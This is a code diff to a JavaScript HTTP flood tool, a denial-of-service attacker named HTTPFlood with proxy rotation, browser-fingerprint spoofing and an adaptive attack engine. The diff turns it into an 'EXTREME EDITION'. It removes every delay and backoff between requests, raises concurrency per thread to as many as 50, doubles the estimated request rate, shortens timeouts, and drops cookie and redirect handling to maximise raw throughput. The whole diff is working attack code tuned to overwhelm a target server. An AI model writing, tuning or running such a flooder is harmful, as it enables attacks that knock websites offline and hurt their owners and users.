@@ -58,7 +58,7 @@ ${colors.cyan}${colors.bright}
 ║     ${colors.magenta}╚██████╔╝███████╗██║   ██║  ██║██║  ██║     ╚████╔╝    ██║${colors.cyan}      ║
 ║      ${colors.magenta}╚═════╝ ╚══════╝╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝      ╚═══╝     ╚═╝${colors.cyan}      ║
 ║                                                                  ║
-║        ${colors.yellow}${colors.bright}PERFECT EDITION${colors.cyan}  ${colors.dim}│${colors.reset}${colors.cyan}  ${colors.green}Smart AI${colors.cyan}  ${colors.dim}│${colors.reset}${colors.cyan}  ${colors.blue}Adaptive Engine${colors.cyan}        ║
+║        ${colors.yellow}${colors.bright}EXTREME EDITION${colors.cyan}  ${colors.dim}│${colors.reset}${colors.cyan}  ${colors.green}Smart AI${colors.cyan}  ${colors.dim}│${colors.reset}${colors.cyan}  ${colors.red}MAX POWER${colors.cyan}           ║
 ║                                                                  ║
 ║  ${colors.green}${icons.success} Adaptive Concurrency${colors.cyan}     ${colors.green}${icons.success} HTTP/2 Support${colors.cyan}                  ║
 ║  ${colors.green}${icons.success} Weighted Proxy Select${colors.cyan}    ${colors.green}${icons.success} Session Emulation${colors.cyan}               ║
@@ -466,13 +466,8 @@ function rotateAttackPattern() {
         }
     }
     
-    // Return delay based on pattern
-    switch (config.attackPattern) {
-        case 'burst': return 0;
-        case 'steady': return 10; // Reduced from 50ms
-        case 'mixed': return Math.random() > 0.7 ? 0 : 5; // Reduced from 25ms
-        default: return 0;
-    }
+    // Return delay based on pattern - DISABLED FOR EXTREME SPEED
+    return 0; // NO DELAYS AT ALL
 }
 
 function getHealthyProxy() {
@@ -848,7 +843,8 @@ function displayStats() {
     console.log(`${colors.yellow}${icons.info} Memory: ${colors.bright}${memMB}MB${colors.reset} ${colors.dim}│${colors.reset} ${colors.blue}Sent: ${colors.bright}${(config.stats.bytesSent / 1024).toFixed(0)} KB${colors.reset} ${colors.dim}│${colors.reset} ${colors.magenta}Received: ${colors.bright}${(config.stats.bytesReceived / 1024).toFixed(0)} KB${colors.reset}`);
     
     // Adaptive metrics
-    const concurrencyBar = '█'.repeat(config.stats.adaptiveMetrics.currentConcurrency) + colors.dim + '░'.repeat(10 - config.stats.adaptiveMetrics.currentConcurrency) + colors.reset;
+    const barWidth = Math.min(50, config.stats.adaptiveMetrics.currentConcurrency);
+    const concurrencyBar = '█'.repeat(Math.floor(barWidth / 2.5)) + colors.dim + '░'.repeat(20 - Math.floor(barWidth / 2.5)) + colors.reset;
     console.log(colors.cyan + '─'.repeat(70) + colors.reset);
     console.log(`${colors.bright}${colors.green}[ADAPTIVE ENGINE]${colors.reset}`);
     console.log(`${colors.yellow}${patternIcon} Pattern: ${colors.bright}${config.attackPattern.toUpperCase()}${colors.reset} ${colors.dim}│${colors.reset} ${colors.green}Concurrency: ${colors.bright}${config.stats.adaptiveMetrics.currentConcurrency}${colors.reset} ${colors.green}${concurrencyBar}${colors.reset}`);
@@ -898,8 +894,8 @@ class HTTPFlood {
         console.log(`${colors.blue}${icons.target} Target: ${colors.bright}${this.url}${colors.reset}`);
         console.log(`${colors.magenta}${icons.clock} Duration: ${colors.bright}${this.duration}s${colors.reset} ${colors.dim}│${colors.reset} ${colors.green}${icons.fire} Threads: ${colors.bright}${this.threads}${colors.reset}`);
         console.log(`${colors.cyan}${'─'.repeat(70)}${colors.reset}`);
-        console.log(`${colors.green}${icons.success} Mode: ${colors.bright}ADAPTIVE${colors.reset}${colors.green} (5-20 concurrent/thread, auto-tuned)${colors.reset}`);
-        console.log(`${colors.yellow}${icons.fire} Pattern: ${colors.bright}Rotating FAST${colors.reset}${colors.yellow} (burst→steady→mixed, 30s cycles)${colors.reset}`);
+        console.log(`${colors.green}${icons.success} Mode: ${colors.bright}EXTREME${colors.reset}${colors.green} (10-50 concurrent/thread, INSANE SPEED)${colors.reset}`);
+        console.log(`${colors.yellow}${icons.fire} Pattern: ${colors.bright}NO DELAYS${colors.reset}${colors.yellow} (maximum throughput mode)${colors.reset}`);
         console.log(`${colors.magenta}${icons.check} Proxies: ${colors.bright}Weighted selection${colors.reset}${colors.magenta} (best 3x more likely)${colors.reset}`);
         console.log(`${colors.blue}${icons.info} Recovery: ${colors.bright}Exponential backoff${colors.reset}${colors.blue} + 30s temp bans${colors.reset}`);
         console.log(`${colors.cyan}${icons.success} Session: ${colors.bright}Cookie tracking${colors.reset}${colors.cyan} + 10 redirects + realistic navigation${colors.reset}`);
@@ -907,7 +903,7 @@ class HTTPFlood {
         console.log(`${colors.magenta}${icons.check} Fingerprint: ${colors.bright}5 Browser Profiles${colors.reset}${colors.magenta} (randomized per thread)${colors.reset}`);
         console.log(`${colors.yellow}${icons.check} Connection: ${colors.bright}${config.proxies.length > 0 ? '2048' : '1024'} socket pool${colors.reset}${colors.yellow} + Keep-Alive${colors.reset}`);
         
-        const baseRPS = config.proxies.length > 0 ? 400 : 500;
+        const baseRPS = config.proxies.length > 0 ? 800 : 1000; // EXTREME MODE
         const estimatedRPS = Math.min(this.threads * baseRPS, config.maxRPS || (config.proxies.length > 0 ? 50000 : 100000));
         console.log(`${colors.cyan}${'─'.repeat(70)}${colors.reset}`);
         console.log(`${colors.bright}${colors.green}${icons.fire} Estimated Throughput: ${colors.yellow}${estimatedRPS.toLocaleString()}${colors.reset}${colors.green} - ${colors.yellow}${Math.min((estimatedRPS * 1.5), config.maxRPS || 999999).toLocaleString()}${colors.reset}${colors.green} req/s${colors.reset}`);
@@ -954,7 +950,7 @@ class HTTPFlood {
         const profile = getRandomElement(BROWSER_PROFILES);
         const useProxy = config.proxies.length > 0;
         const isHttpsTarget = this.url.startsWith('https://');
-        let concurrency = 5; // Adaptive: starts at 5, can go 5-20
+        let concurrency = 10; // Adaptive: starts at 10, can go 10-50 EXTREME
         
         const endTime = Date.now() + this.duration * 1000;
         
@@ -967,13 +963,6 @@ class HTTPFlood {
                 // Add keep-alive for proxy compatibility
                 if (useProxy) {
                     headers['Connection'] = 'keep-alive';
-                }
-                
-                // Session emulation: Add cookies if we have them
-                if (Object.keys(cookieJar).length > 0) {
-                    headers['Cookie'] = Object.entries(cookieJar)
-                        .map(([k, v]) => `${k}=${v}`)
-                        .join('; ');
                 }
                 
                 let targetUrl = this.url;
@@ -1033,31 +1022,11 @@ class HTTPFlood {
                     method: this.method.toLowerCase(),
                     url: targetUrl,
                     headers,
-                    timeout: useProxy ? 7000 : 5000, // Reduced from 10000ms
-                    maxRedirects: 10, // Follow all redirects
+                    timeout: useProxy ? 3000 : 2000, // EXTREME: 3s/2s only
+                    maxRedirects: 0, // DISABLED for speed
                     validateStatus: () => true,
-                    decompress: true,
-                    // Preserve cookies across redirects
-                    withCredentials: true,
-                    // Follow redirects and maintain session
-                    beforeRedirect: (options, responseDetails) => {
-                        // Preserve cookies on redirect
-                        if (responseDetails.headers['set-cookie']) {
-                            const cookies = Array.isArray(responseDetails.headers['set-cookie'])
-                                ? responseDetails.headers['set-cookie']
-                                : [responseDetails.headers['set-cookie']];
-                            cookies.forEach(cookie => {
-                                const [pair] = cookie.split(';');
-                                const [key, value] = pair.split('=');
-                                if (key && value) cookieJar[key.trim()] = value.trim();
-                            });
-                            
-                            // Add cookies to redirect request
-                            options.headers['Cookie'] = Object.entries(cookieJar)
-                                .map(([k, v]) => `${k}=${v}`)
-                                .join('; ');
-                        }
-                    }
+                    decompress: false, // DISABLED for speed
+                    withCredentials: false // DISABLED for speed
                 };
                 
                 if (useProxy && cachedAgent) {
@@ -1080,18 +1049,6 @@ class HTTPFlood {
                 
                 const response = await axios(axiosConfig);
                 const latency = Date.now() - startTime;
-                
-                // Session emulation: Extract and store cookies
-                if (response.headers['set-cookie']) {
-                    const cookies = Array.isArray(response.headers['set-cookie'])
-                        ? response.headers['set-cookie']
-                        : [response.headers['set-cookie']];
-                    cookies.forEach(cookie => {
-                        const [pair] = cookie.split(';');
-                        const [key, value] = pair.split('=');
-                        if (key && value) cookieJar[key.trim()] = value.trim();
-                    });
-                }
                 
                 // Track HTTP/2 usage
                 if (response.request?.socket?.alpnProtocol === 'h2') {
@@ -1146,11 +1103,8 @@ class HTTPFlood {
                         proxyIndex = (proxyIndex + 1) % config.proxies.length;
                         failCount = 0;
                         retryDelay = 100;
-                    } else {
-                        // Exponential backoff: 100ms, 200ms, 400ms
-                        await new Promise(resolve => setTimeout(resolve, retryDelay));
-                        retryDelay = Math.min(retryDelay * 2, 800);
                     }
+                    // NO BACKOFF DELAY - EXTREME SPEED
                 } else if (useProxy && failCount >= 5) {
                     // Ban after 5 fails for other errors
                     const currentProxy = config.proxies[proxyIndex];
@@ -1169,12 +1123,12 @@ class HTTPFlood {
             if (localCount > 0 && localCount % 50 === 0) {
                 const currentSuccessRate = (successCount / localCount) * 100;
                 
-                if (currentSuccessRate > 85 && concurrency < 20) {
-                    concurrency++;
+                if (currentSuccessRate > 80 && concurrency < 50) {
+                    concurrency += 2; // Increase faster
                     if (config.debug) {
                         console.log(`[ADAPTIVE] T${threadId}: Increased concurrency to ${concurrency} (${currentSuccessRate.toFixed(1)}% success)`);
                     }
-                } else if (currentSuccessRate < 50 && concurrency > 5) {
+                } else if (currentSuccessRate < 40 && concurrency > 10) {
                     concurrency--;
                     if (config.debug) {
                         console.log(`[ADAPTIVE] T${threadId}: Decreased concurrency to ${concurrency} (${currentSuccessRate.toFixed(1)}% success)`);
@@ -1194,11 +1148,7 @@ class HTTPFlood {
             
             await Promise.all(batch);
             
-            // Pattern-based delay rotation
-            const patternDelay = rotateAttackPattern();
-            if (patternDelay > 0) {
-                await new Promise(resolve => setTimeout(resolve, patternDelay));
-            }
+            // NO DELAYS - EXTREME MODE
             
             // Check RPS limit if enabled
             if (config.maxRPS && useProxy) {
